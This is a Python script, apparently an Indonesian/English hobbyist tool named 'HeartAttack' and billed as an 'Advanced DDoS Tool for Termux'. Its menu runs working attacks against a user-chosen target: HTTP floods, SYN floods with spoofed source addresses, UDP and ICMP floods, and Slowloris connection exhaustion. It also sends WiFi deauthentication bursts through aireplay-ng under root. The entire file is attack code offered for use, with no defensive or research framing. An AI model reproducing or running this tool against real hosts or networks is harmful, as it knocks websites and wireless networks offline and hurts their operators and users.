#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import threading
import socket
import random
import subprocess
import struct
import requests
from scapy.all import IP, TCP, UDP, ICMP, Raw, send
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp
from scapy.packet import Raw

class Colors:
    PINK = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear_screen():
    os.system('clear')

# Banner
def show_banner():
    clear_screen()
    print(f"{Colors.PINK}")
    if os.system("figlet -f big HeartAttack > /dev/null 2>&1") != 0:
        print("HeartAttack - Termux Edition")
    else:
        os.system("figlet -f big HeartAttack")
    print(f"{Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    print(f"{Colors.YELLOW}   🚀 Advanced DDoS Tool for Termux by Dylphiiee🍪 {Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}\n")

# Loading animation
def loading_animation(message, duration=2):
    print(f"{Colors.GREEN}{message} {Colors.END}", end="")
    for _ in range(duration * 5):
        print(f"{Colors.PINK}♥{Colors.END}", end="", flush=True)
        time.sleep(0.2)
    print()

# Install dependencies khusus Termux
def install_dependencies():
    print(f"{Colors.BOLD}{Colors.CYAN}📦 Checking Termux dependencies...{Colors.END}")
    
    # Check if we're in Termux
    is_termux = "com.termux" in os.environ.get("PREFIX", "")
    
    packages = ["figlet", "python", "scapy", "git"]
    for package in packages:
        if package == "scapy":
            try:
                import scapy
                print(f"{Colors.GREEN}✅ Scapy is already installed{Colors.END}")
            except ImportError:
                print(f"{Colors.YELLOW}Installing {package}...{Colors.END}")
                os.system("pip install scapy > /dev/null 2>&1")
        else:
            result = subprocess.run(["which", package], capture_output=True, text=True)
            if result.returncode != 0:
                print(f"{Colors.YELLOW}Installing {package}...{Colors.END}")
                if is_termux:
                    os.system(f"pkg install {package} -y > /dev/null 2>&1")
                else:
                    os.system(f"apt install {package} -y > /dev/null 2>&1")
    
    # Install tsu for root access in Termux
    if is_termux:
        result = subprocess.run(["which", "tsu"], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"{Colors.YELLOW}Installing tsu for root access...{Colors.END}")
            os.system("pkg install tsu -y > /dev/null 2>&1")
    
    print(f"{Colors.GREEN}✅ Dependencies check completed!{Colors.END}")
    time.sleep(1)

# Check if running in Termux
def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "")

# Check root access
def check_root():
    if is_termux():
        # For Termux, we use tsu
        result = subprocess.run(["tsu", "-c", "id -u"], capture_output=True, text=True)
        return result.stdout.strip() == "0"
    else:
        return os.geteuid() == 0

# Run command with root privileges in Termux
def run_as_root(cmd):
    if is_termux() and not check_root():
        return subprocess.run(f"tsu -c '{cmd}'", shell=True, capture_output=True, text=True)
    else:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True)

# Enhanced HTTP Flood dengan lebih banyak requests
def http_flood(target, port, duration, threads):
    print(f"{Colors.RED}🚀 Starting HTTP Flood attack to {target}...{Colors.END}")
    request_count = 0
    start_time = time.time()
    end_time = start_time + duration

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    ]

    paths = [
        "/", "/admin", "/wp-login.php", "/api", "/search", "/test",
        "/robots.txt", "/sitemap.xml", "/.env", "/config", "/db"
    ]

    def send_requests(thread_id):
        nonlocal request_count
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                
                # Multiple requests per connection
                for _ in range(random.randint(5, 15)):
                    try:
                        user_agent = random.choice(user_agents)
                        path = random.choice(paths)
                        request = (
                            f"GET {path} HTTP/1.1\r\n"
                            f"Host: {target}\r\n"
                            f"User-Agent: {user_agent}\r\n"
                            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                            f"Accept-Language: en-US,en;q=0.5\r\n"
                            f"Accept-Encoding: gzip, deflate\r\n"
                            f"Connection: keep-alive\r\n"
                            f"Cache-Control: max-age=0\r\n"
                            f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n\r\n"
                        )
                        s.sendall(request.encode())
                        request_count += 1
                        if request_count % 100 == 0:
                            elapsed = time.time() - start_time
                            print(f"{Colors.YELLOW}📊 Sent: {request_count} | Time: {elapsed:.2f}s {Colors.END}", end="\r")
                    except:
                        break
                s.close()
            except Exception as e:
                pass

    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=send_requests, args=(i+1,))
        t.daemon = True
        t.start()
        thread_pool.append(t)

    # Wait for attack to complete
    while time.time() < end_time:
        time.sleep(0.1)
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total requests: {request_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")
    print(f"{Colors.YELLOW}📡 Average: {request_count/total_time:.2f} requests/second{Colors.END}")

# SYN Flood Attack untuk Termux
def syn_flood(target, port, duration, threads):
    print(f"{Colors.RED}🚀 Starting SYN Flood attack to {target}:{port}...{Colors.END}")
    packet_count = 0
    start_time = time.time()
    end_time = start_time + duration

    def send_syn(thread_id):
        nonlocal packet_count
        while time.time() < end_time:
            try:
                # Generate random source IP
                src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                
                # Create IP and TCP layers
                ip_layer = IP(src=src_ip, dst=target)
                tcp_layer = TCP(sport=random.randint(1024, 65535), dport=port, flags="S", seq=random.randint(1000, 100000))
                
                # Send the packet
                send(ip_layer/tcp_layer, verbose=0)
                packet_count += 1
                
                if packet_count % 50 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.YELLOW}📊 Sent: {packet_count} | Time: {elapsed:.2f}s {Colors.END}", end="\r")
            except Exception as e:
                pass

    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=send_syn, args=(i+1,))
        t.daemon = True
        t.start()
        thread_pool.append(t)

    # Wait for attack to complete
    while time.time() < end_time:
        time.sleep(0.1)
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total packets: {packet_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")
    print(f"{Colors.YELLOW}📡 Average: {packet_count/total_time:.2f} packets/second{Colors.END}")

# UDP Flood Attack untuk Termux
def udp_flood(target, port, duration, threads):
    print(f"{Colors.RED}🚀 Starting UDP Flood attack to {target}:{port}...{Colors.END}")
    packet_count = 0
    start_time = time.time()
    end_time = start_time + duration

    def send_udp(thread_id):
        nonlocal packet_count
        while time.time() < end_time:
            try:
                # Generate random source IP and port
                src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                src_port = random.randint(1024, 65535)
                
                # Create socket and send UDP packet
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(random.randint(64, 1024))
                sock.sendto(payload, (target, port))
                sock.close()
                
                packet_count += 1
                
                if packet_count % 50 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.YELLOW}📊 Sent: {packet_count} | Time: {elapsed:.2f}s {Colors.END}", end="\r")
            except Exception as e:
                pass

    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=send_udp, args=(i+1,))
        t.daemon = True
        t.start()
        thread_pool.append(t)

    # Wait for attack to complete
    while time.time() < end_time:
        time.sleep(0.1)
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total packets: {packet_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")
    print(f"{Colors.YELLOW}📡 Average: {packet_count/total_time:.2f} packets/second{Colors.END}")

# ICMP Flood Attack (Ping Flood) untuk Termux
def icmp_flood(target, duration, threads):
    print(f"{Colors.RED}🚀 Starting ICMP Flood attack to {target}...{Colors.END}")
    packet_count = 0
    start_time = time.time()
    end_time = start_time + duration

    def send_icmp(thread_id):
        nonlocal packet_count
        while time.time() < end_time:
            try:
                # Use system ping command for better compatibility
                os.system(f"ping -c 1 -W 1 {target} > /dev/null 2>&1")
                packet_count += 1
                
                if packet_count % 10 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.YELLOW}📊 Sent: {packet_count} | Time: {elapsed:.2f}s {Colors.END}", end="\r")
            except:
                pass

    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=send_icmp, args=(i+1,))
        t.daemon = True
        t.start()
        thread_pool.append(t)

    # Wait for attack to complete
    while time.time() < end_time:
        time.sleep(0.1)
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total packets: {packet_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")
    print(f"{Colors.YELLOW}📡 Average: {packet_count/total_time:.2f} packets/second{Colors.END}")

# Slowloris Attack untuk Termux
def slowloris_attack(target, port, duration, sockets_count):
    print(f"{Colors.RED}🚀 Starting Slowloris attack to {target}:{port}...{Colors.END}")
    start_time = time.time()
    end_time = start_time + duration
    sockets_list = []
    request_count = 0

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36",
    ]

    # Create multiple sockets
    for i in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            
            # Send incomplete HTTP request
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
            s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
            s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
            s.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
            s.send("Accept-Encoding: gzip, deflate\r\n".encode())
            s.send("Connection: keep-alive\r\n".encode())
            
            sockets_list.append(s)
            request_count += 1
        except:
            pass

    print(f"{Colors.YELLOW}📊 Established {len(sockets_list)} connections{Colors.END}")

    # Keep connections alive by sending headers periodically
    while time.time() < end_time and sockets_list:
        for s in list(sockets_list):
            try:
                # Send keep-alive headers
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                request_count += 1
                time.sleep(random.randint(5, 15))
            except:
                sockets_list.remove(s)
                try:
                    s.close()
                except:
                    pass
                
                # Try to recreate the socket
                try:
                    new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_s.settimeout(4)
                    new_s.connect((target, port))
                    
                    # Send incomplete HTTP request
                    new_s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                    new_s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
                    new_s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
                    new_s.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
                    new_s.send("Accept-Encoding: gzip, deflate\r\n".encode())
                    new_s.send("Connection: keep-alive\r\n".encode())
                    
                    sockets_list.append(new_s)
                    request_count += 1
                except:
                    pass

    # Close all sockets
    for s in sockets_list:
        try:
            s.close()
        except:
            pass

    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total requests: {request_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")

# Web Attack Menu
def web_attack():
    clear_screen()
    print(f"{Colors.PINK}")
    if os.system("figlet -f small Web Attack > /dev/null 2>&1") != 0:
        print("Web Attack")
    else:
        os.system("figlet -f small Web Attack")
    print(f"{Colors.END}")
    print(f"{Colors.CYAN}🌐 Select Web Attack Method:{Colors.END}")
    print(f"{Colors.YELLOW}1. HTTP Flood 💦{Colors.END}")
    print(f"{Colors.YELLOW}2. SYN Flood 🚪{Colors.END}")
    print(f"{Colors.YELLOW}3. UDP Flood 📨{Colors.END}")
    print(f"{Colors.YELLOW}4. ICMP Flood 📡{Colors.END}")
    print(f"{Colors.YELLOW}5. Slowloris Attack 🐌{Colors.END}")
    print(f"{Colors.YELLOW}6. Back 🔙{Colors.END}")

    choice = input(f"{Colors.GREEN}🎯 Select method (1-6): {Colors.END}")
    if choice == "6":
        return

    target = input(f"{Colors.GREEN}🌐 Target IP/domain: {Colors.END}")
    
    if choice in ["1", "2", "3", "5"]:
        port = input(f"{Colors.GREEN}🔌 Port (default: 80): {Colors.END}") or "80"
        try:
            port = int(port)
        except:
            print(f"{Colors.RED}❌ Port must be a number!{Colors.END}")
            time.sleep(2)
            return web_attack()
    
    duration = input(f"{Colors.GREEN}⏱️ Duration (seconds): {Colors.END}")
    try:
        duration = int(duration)
    except:
        print(f"{Colors.RED}❌ Duration must be a number!{Colors.END}")
        time.sleep(2)
        return web_attack()
    
    if choice in ["1", "2", "3", "4"]:
        threads = input(f"{Colors.GREEN}🧵 Threads (default: 50): {Colors.END}") or "50"
        try:
            threads = int(threads)
        except:
            print(f"{Colors.RED}❌ Threads must be a number!{Colors.END}")
            time.sleep(2)
            return web_attack()
    
    if choice == "5":
        sockets = input(f"{Colors.GREEN}🔗 Number of sockets (default: 100): {Colors.END}") or "100"
        try:
            sockets = int(sockets)
        except:
            print(f"{Colors.RED}❌ Sockets must be a number!{Colors.END}")
            time.sleep(2)
            return web_attack()

    if choice == "1":
        http_flood(target, port, duration, threads)
    elif choice == "2":
        syn_flood(target, port, duration, threads)
    elif choice == "3":
        udp_flood(target, port, duration, threads)
    elif choice == "4":
        icmp_flood(target, duration, threads)
    elif choice == "5":
        slowloris_attack(target, port, duration, sockets)

    input(f"{Colors.CYAN}Press Enter to continue...{Colors.END}")
    web_attack()

# WiFi Deauthentication Attack untuk Termux
def wifi_deauth(target_bssid, duration, count=0, iface="wlan0"):
    print(f"{Colors.RED}🚀 Starting Deauthentication attack to {target_bssid}...{Colors.END}")
    
    if not check_root():
        print(f"{Colors.RED}❌ Root access required for WiFi attacks!{Colors.END}")
        print(f"{Colors.YELLOW}Run with: tsu -c 'python heartattack.py'{Colors.END}")
        return
    
    start_time = time.time()
    end_time = start_time + duration
    packet_count = 0

    # Use aireplay-ng for deauthentication (more reliable in Termux)
    try:
        # Put interface in monitor mode first
        run_as_root(f"airmon-ng start {iface}")
        
        while time.time() < end_time and (count == 0 or packet_count < count):
            # Send deauth using aireplay-ng
            result = run_as_root(f"aireplay-ng --deauth 10 -a {target_bssid} {iface}mon")
            packet_count += 10
            if packet_count % 10 == 0:
                elapsed = time.time() - start_time
                print(f"{Colors.YELLOW}📊 Sent: {packet_count} | Time: {elapsed:.2f}s {Colors.END}", end="\r")
            time.sleep(1)
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {e}{Colors.END}")
        print(f"{Colors.YELLOW}⚠️ Make sure you have aircrack-ng installed: pkg install aircrack-ng{Colors.END}")

    # Stop monitor mode
    run_as_root(f"airmon-ng stop {iface}mon")
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total packets: {packet_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")

# WiFi Attack Menu untuk Termux
def wifi_attack():
    clear_screen()
    print(f"{Colors.PINK}")
    if os.system("figlet -f small WiFi Attack > /dev/null 2>&1") != 0:
        print("WiFi Attack")
    else:
        os.system("figlet -f small WiFi Attack")
    print(f"{Colors.END}")
    print(f"{Colors.CYAN}📶 Select WiFi Attack Method:{Colors.END}")
    print(f"{Colors.YELLOW}1. Deauthentication Attack 📵{Colors.END}")
    print(f"{Colors.YELLOW}2. Back 🔙{Colors.END}")

    choice = input(f"{Colors.GREEN}🎯 Select method (1-2): {Colors.END}")
    if choice == "2":
        return

    if not check_root():
        print(f"{Colors.RED}❌ Root access required for WiFi attacks!{Colors.END}")
        print(f"{Colors.YELLOW}Run with: tsu -c 'python heartattack.py'{Colors.END}")
        input(f"{Colors.CYAN}Press Enter to continue...{Colors.END}")
        return

    iface = input(f"{Colors.GREEN}📡 Network interface (default: wlan0): {Colors.END}") or "wlan0"
    duration = input(f"{Colors.GREEN}⏱️ Duration (seconds): {Colors.END}")
    try:
        duration = int(duration)
    except:
        print(f"{Colors.RED}❌ Duration must be a number!{Colors.END}")
        time.sleep(2)
        return wifi_attack()

    if choice == "1":
        print(f"{Colors.YELLOW}📶 Scan for networks first...{Colors.END}")
        # Scan for networks
        try:
            run_as_root(f"airmon-ng start {iface}")
            time.sleep(2)
            print(f"{Colors.YELLOW}Scanning for networks (Ctrl+C to stop)...{Colors.END}")
            os.system("timeout 10 airodump-ng wlan0mon")
            run_as_root(f"airmon-ng stop {iface}mon")
        except:
            print(f"{Colors.RED}❌ Could not scan networks{Colors.END}")
        
        target_bssid = input(f"{Colors.GREEN}📶 Target BSSID (MAC address): {Colors.END}")
        wifi_deauth(target_bssid, duration, 0, iface)

    input(f"{Colors.CYAN}Press Enter to continue...{Colors.END}")
    wifi_attack()

# Main
def main():
    show_banner()
    
    # Check if running in Termux
    if is_termux():
        print(f"{Colors.GREEN}✅ Running in Termux environment{Colors.END}")
    else:
        print(f"{Colors.YELLOW}⚠️ Not running in Termux - some features may not work{Colors.END}")
    
    install_dependencies()

    while True:
        show_banner()
        print(f"{Colors.CYAN}Select attack type:{Colors.END}")
        print(f"{Colors.YELLOW}1. WebAttack 🌐{Colors.END}")
        print(f"{Colors.YELLOW}2. WifiAttack 📶{Colors.END}")
        print(f"{Colors.YELLOW}3. Exit 🚪{Colors.END}")

        choice = input(f"{Colors.GREEN}🎯 Select option (1-3): {Colors.END}")
        if choice == "1":
            web_attack()
        elif choice == "2":
            wifi_attack()
        elif choice == "3":
            print(f"{Colors.PINK}❤️  Thank you for using HeartAttack by Dylphiiee🍪{Colors.END}")
            break
        else:
            print(f"{Colors.RED}❌ Invalid option!{Colors.END}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}⚠️ Program terminated by user{Colors.END}")
        sys.exit(0)
